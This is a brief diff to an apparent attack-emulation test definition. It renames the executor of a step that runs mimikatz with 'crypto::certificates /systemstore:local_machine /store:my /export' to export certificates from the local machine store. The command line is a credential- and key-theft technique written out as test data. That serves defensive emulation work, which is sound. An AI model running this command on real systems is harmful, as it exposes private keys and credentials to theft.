@@ -27,4 +27,4 @@ steps:
     - name: export-certificates-with-mimikatz
       inline: |
         "{{.Args.mimikatz_exe}}" "crypto::certificates /systemstore:local_machine /store:my /export"  exit
-      executor: command_prompt
+      executor: cmd
